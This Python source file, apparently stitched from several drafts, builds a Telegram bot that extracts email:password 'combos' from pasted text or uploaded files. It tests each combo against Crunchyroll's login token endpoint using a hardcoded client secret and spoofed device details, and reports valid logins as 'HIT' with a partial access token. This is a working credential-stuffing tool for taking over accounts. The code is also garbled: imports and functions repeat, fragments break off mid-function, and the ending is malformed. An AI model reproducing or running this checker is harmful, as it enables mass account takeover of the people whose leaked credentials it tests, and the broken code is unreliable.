import os
import asyncio
import requests
from uuid import uuid4
from user_agent import generate_user_agent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode


def crunchyroll_check(username: str, password: str):
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    
    headers = {
        "host": "beta-api.crunchyroll.com",
        "content-type": "application/x-www-form-urlencoded",
        "accept-encoding": "gzip",
        "user-agent": generate_user_agent()
    }
    
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "offline_access",
        "client_id": "y2arvjb0h0rgvtizlovy",
        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
        "device_type": "Redmi",
        "device_id": str(uuid4()),
        "device_name": "Redmi note 8 pro"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=25)
        text = response.text

        if response.status_code in (400, 401, 403):
            return "❌ Invalid credentials"

        if "invalid_grant" in text or "invalid_credentials" in text:
            return "❌ Wrong email or password"

        if "too_many_requests" in text:
            return "⏳ Rate limited. Try later"

        if response.status_code == 200 and "access_token" in text:
            result = response.json()
import os
import asyncio
import re
import requests
from uuid import uuid4
from user_agent import generate_user_agent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode


def crunchyroll_check(username: str, password: str):
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": generate_user_agent()
    }
    
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "offline_access",
        "client_id": "y2arvjb0h0rgvtizlovy",
        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
        "device_type": "Redmi",
        "device_id": str(uuid4()),
        "device_name": "Redmi note 8 pro"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=25)
        if response.status_code != 200:
            return "❌ Invalid credentials"

        token_data = response.json()
        access_token = token_data.get("access_token")
        if not access_token:
            return "❌ Invalid credentials"

        return f"✅ **HIT**\nEmail: `{username}`\nToken: `{access_token[:60]}...`"

    except Exception as e:
        return f"⚠️ Error: {str(e)[:80]}"


# ==================== SMART COMBO EXTRACTOR ====================
import os
import asyncio
import re
import requests
from uuid import uuid4
from user_agent import generate_user_agent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode


def crunchyroll_check(username: str, password: str):
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": generate_user_agent()
    }
    
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "offline_access",
        "client_id": "y2arvjb0h0rgvtizlovy",
        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
        "device_type": "Redmi",
        "device_id": str(uuid4()),
        "device_name": "Redmi note 8 pro"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=25)
        
        if response.status_code != 200:
            return "❌ Invalid credentials"

        token_data = response.json()
        access_token = token_data.get("access_token")
        
        if not access_token:
            return "❌ Invalid credentials"

        return f"✅ **HIT**\nEmail: `{username}`\nToken: `{access_token[:60]}...`"

    except Exception as e:
        return f"⚠️ Error: {str(e)[:80]}"


def extract_combos(text: str):
    pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):([^\s|]+)'
    matches = re.findall(pattern, text)
    combos = [f"{email.strip()}:{password.strip()}" for email, password in matches if email and password]
    return combos


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎉 **Smart Crunchyroll Checker**\n\n"
        "Paste messy text or upload .txt\n"
        "I will auto extract email:password",
        parse_mode=ParseMode.MARKDOWN
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip() if update.message.text else ""
    if not text or text.startswith('/'):
        return

    combos = extract_combos(text)

    if not combos:
        await update.message.reply_text("❌ No email:password found.")
        return

    await update.message.reply_text(f"✅ Extracted {len(combos)} combo(s). Checking...")

    for i, combo in enumerate(combos, 1):
        email, password = combo.split(":", 1)
        await update.message.reply_text(f"[{i}/{len(combos)}] → `{email}`", parse_mode=ParseMode.MARKDOWN)
        
        result = crunchyroll_check(email, password)
        await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
        
        await asyncio.sleep(1.8)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files allowed")
        return

    await update.message.reply_text("📂 Processing file...")

    try:
        file = await context.bot.get_file(document.file_id)
        content = (await file.download_as_bytearray()).decode('utf-8', errors='ignore')

        combos = extract_combos(content)

        if not combos:
            await update.message.reply_text("❌ No combos found in file.")
            return

        await update.message.reply_text(f"✅ Found {len(combos)} combos. Starting...")

        for i, combo in enumerate(combos, 1):
            email, password = combo.split(":", 1)
            await update.message.reply_text(f"[{i}/{len(combos)}] → `{email}`", parse_mode=ParseMode.MARKDOWN)
            
            result = crunchyroll_check(email, password)
            await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
            
            await asyncio.sleep(1.8)

    except Exception as e:
        await update.message.reply_text(f"❌ File error: {str(e)[:100]}")


def main():
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if not TOKEN:
        print("❌ TELEGRAM_BOT_TOKEN not set!")
        return

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("🚀 Smart Crunchyroll Checker is Running...")
    app.run_polling()


if __name__ == "__main__":
    main().ALL, handle_document))

    print("🚀 Smart Crunchyroll Bot Running...")
    app.run_polling()


if __name__ == "__main__":
    main()
    print("🚀 Crunchyroll Checker Bot Started Successfully!")
    app.run_polling()


if __name__ == "__main__":
    main()
